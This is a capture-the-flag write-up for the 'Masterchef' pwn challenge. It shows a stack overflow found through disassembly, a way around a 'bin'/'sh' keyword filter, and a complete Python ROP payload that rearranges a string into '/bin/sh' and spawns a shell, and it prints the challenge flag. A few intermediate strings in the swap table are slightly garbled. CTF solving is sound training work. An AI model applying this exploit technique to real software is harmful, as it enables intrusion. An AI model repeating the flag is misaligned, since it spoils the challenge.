---
title: "Masterchef"
difficulty: Medium
description: "Here's a pwn challenge. We'll let you cook."
flag: "CSC{shE112_DR0PpEd_1n_7HE_d15h!_TH47s_4_R34L_m42TErP1Ec3!}"
---

# Masterchef

> *Here's a pwn challenge. We'll let you cook.*

dynamically linked x86-64, no PIE. the binary asks for a "recipe":

```
$ strings masterchef 
[...]
Are you the masterchef that can cheese this binary? Please tell me your recipe!
You should give me one continuous recipe! Don't try to send data multiple times! Exiting...
Forbidden ingredient detected! Exiting...
/ashbins/
[...]
```

looking at main:

```
000000000040127e <main>:
  ...
  4012b0:	call   401100 <malloc@plt>       # malloc(4), some check variable
  4012b5:	mov    %rax,-0x8(%rbp)
  ...
  4012da:	movl   $0x1,(%rax)               # *check = 1
  ...
  4012f3:	lea    -0x1d0(%rbp),%rax          # input buffer at rbp-0x1d0
  4012fa:	mov    $0x190,%esi                # 0x190 = 400 bytes
  4012ff:	mov    %rax,%rdi
  401302:	call   4010e0 <fgets@plt>         # fgets(input, 0x190, stdin)
  ...
  401332:	mov    (%rax),%eax
  401334:	cmp    $0x1,%eax                  # if *check != 1, reject
  401337:	je     40135b
  ...
  401378:	lea    0xd8e(%rip),%rsi           # "bin"
  40137f:	mov    %rax,%rdi
  401382:	call   401140 <strstr@plt>        # strstr(input, "bin")
  401387:	test   %rax,%rax
  40138a:	jne    4013a7                     # if found -> "Forbidden ingredient"
  40138c:	lea    -0x1d0(%rbp),%rax
  401393:	lea    0xd77(%rip),%rsi           # "sh"
  40139a:	mov    %rax,%rdi
  40139d:	call   401140 <strstr@plt>        # strstr(input, "sh")
  4013a2:	test   %rax,%rax
  4013a5:	je     4013bd                     # if found -> "Forbidden ingredient"
  4013a7:	lea    0xd6a(%rip),%rdi
  4013ae:	call   4010d0 <puts@plt>          # "Forbidden ingredient detected!"
  4013b3:	mov    $0x1,%edi
  4013b8:	call   401130 <exit@plt>
  4013bd:	lea    -0x1d0(%rbp),%rcx          # source = rbp-0x1d0
  4013c4:	lea    -0x40(%rbp),%rax           # dest = rbp-0x40 (only 64 bytes!)
  4013c8:	mov    $0x190,%edx               # size = 0x190 = 400 bytes
  4013cd:	mov    %rcx,%rsi
  4013d0:	mov    %rax,%rdi
  4013d3:	call   4010f0 <memcpy@plt>        # memcpy(rbp-0x40, input, 0x190) OVERFLOW
  ...
  4013e9:	leave
  4013ea:	ret
```

`fgets` reads up to 0x190 bytes into `rbp-0x1d0`. then after the filter check, `memcpy` copies all 0x190 bytes into `rbp-0x40`. that's 400 bytes into a 64-byte buffer. the saved return address is at `rbp+0x08`, so offset from `rbp-0x40` is `0x40 + 0x08 = 0x48 = 72`. 

but the `strstr` checks block any payload containing "bin" or "sh". that includes the string `/bin/sh` we'd need for `execve`. it also means any gadget addresses containing those bytes are off limits.

now that `/ashbins/` string makes sense. it lives in `.data` at `0x404010`:

```
$ objdump -s -j .data masterchef
Contents of section .data:
 404000 00000000 00000000 00000000 00000000  ................
 404010 2f617368 62696e73 2f0000             /ashbins/..
```

it's an anagram of `/bin/sh`. and there are ROP gadgets with cooking names:

```
0000000000401236 <call_for_moms_help>:
  40123a:	syscall

0000000000401249 <add_tomatoes>:
  40124d:	pop    %rdi
  40124e:	ret

0000000000401252 <add_cheese>:
  401256:	pop    %rsi
  401257:	ret

000000000040125b <add_flour>:
  40125f:	pop    %rdx
  401260:	ret

0000000000401264 <add_basilicum>:
  401268:	pop    %rax
  401269:	ret

000000000040126d <use_mixer>:
  401271:	mov    (%esi),%al
  401274:	xchg   %al,(%edi)
  401277:	mov    %al,(%esi)
  40127a:	ret
```

`use_mixer` swaps the byte at `[esi]` with the byte at `[edi]`. five swaps can rearrange `/ashbins/\0` into `/bin/sh\0`:

```
/ashbins/\0     index: 0 1 2 3 4 5 6 7 8 9
swap(1,4): a<->b  -> /bshains/
swap(2,5): s<->i  -> /bihans/
swap(3,6): h<->n  -> /binash/
swap(4,8): a<->/ -> /bin/shs
swap(7,9): s<->\0 -> /bin/sh\0
```

then standard `execve("/bin/sh", NULL, NULL)` via syscall 59.

```python
from struct import pack

p64 = lambda x: pack('<Q', x)

pop_rdi    = 0x40124d
pop_rsi    = 0x401256
pop_rdx    = 0x40125f
pop_rax    = 0x401268
syscall    = 0x40123a
mixer      = 0x401271
secret     = 0x404010

payload = b'A' * 72

for src, dst in [(1,4), (2,5), (3,6), (4,8), (7,9)]:
    payload += p64(pop_rsi) + p64(secret + src)
    payload += p64(pop_rdi) + p64(secret + dst)
    payload += p64(mixer)

payload += p64(pop_rdi) + p64(secret)
payload += p64(pop_rsi) + p64(0)
payload += p64(pop_rdx) + p64(0)
payload += p64(pop_rax) + p64(59)
payload += p64(syscall)

```

`CSC{shE112_DR0PpEd_1n_7HE_d15h!_TH47s_4_R34L_m42TErP1Ec3!}`
